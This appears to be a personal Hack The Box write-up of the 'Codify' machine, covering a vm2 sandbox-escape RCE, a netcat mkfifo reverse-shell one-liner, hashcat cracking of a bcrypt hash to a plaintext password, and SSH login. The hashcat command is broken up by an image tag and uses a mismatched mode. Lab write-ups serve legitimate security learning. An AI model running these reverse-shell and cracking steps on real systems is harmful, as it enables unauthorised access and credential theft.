                                                  CODIFY WRITEUP

-added the box ip to /etc/hosts

-did small nmap scan. found some ports open

-went to the website . Its basically online javascript runner BUT!! BUT!! its using vm2 library for sandboxing
<img width="1249" alt="Screenshot 2023-12-04 at 9 16 51 PM" src="https://github.com/a6ar55/HTB-writeups/assets/117556787/cc49689a-7f8e-4e19-b8d9-765c1f426759">


after basic googling found out that its vulnerable to RCE.

lot long after found this exploit. “https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac”

first of all lets look what’s inside /etc/passwd 

Yess!  we got the user joshua
<img width="1337" alt="Screenshot 2023-12-04 at 9 25 01 PM" src="https://github.com/a6ar55/HTB-writeups/assets/117556787/5de94ffd-4944-43e3-9eb7-1a1eb1102394">



now lets try to get reverse shell.

lets go to https://www.revshells.com/ and find a suitable command 

after searching for few minute found this working command  “`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|**sh** -i 2>&1|nc <tunnel-ip> **1234** >/tmp/f`”

HELL YEAH!! Got the reverse shell
<img width="1336" alt="Screenshot 2023-12-04 at 9 37 51 PM" src="https://github.com/a6ar55/HTB-writeups/assets/117556787/d2e7837b-2a28-44a3-899b-58e605ddb72e">


went through the directories and found this in /var/www/contact/tickets.db
<img width="865" alt="Screenshot 2023-12-04 at 10 10 41 PM" src="https://github.com/a6ar55/HTB-writeups/assets/117556787/13a9b32c-c2bd-480f-8a20-9e435dfa5a49">



basically this is a bcrypt hash lets crack it with hashcat 

`“hashcat -a 0 -m 320
<img width="852" alt="Screenshot 2023-12-04 at 10 11 18 PM" src="https://github.com/a6ar55/HTB-writeups/assets/117556787/3b3ed111-7da7-43bc-98d5-1415986009bd">
0 '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2' rockyou.txt”`


and voila we got the password for `joshua` its `spongebob1`

from the  nmap we noticed that port 22 was open now lets try sshing into joshua with the password we got.

`ssh joshua@10.10.11.239`
<img width="864" alt="Screenshot 2023-12-04 at 10 19 31 PM" src="https://github.com/a6ar55/HTB-writeups/assets/117556787/e2cc0e10-1237-493d-bbb6-7032d59be5e5">


and finally lets snatch over user flag!!!


<img width="406" alt="Screenshot 2023-12-04 at 10 20 39 PM" src="https://github.com/a6ar55/HTB-writeups/assets/117556787/91dc6e61-eb05-4221-8280-0883f2a1321a">


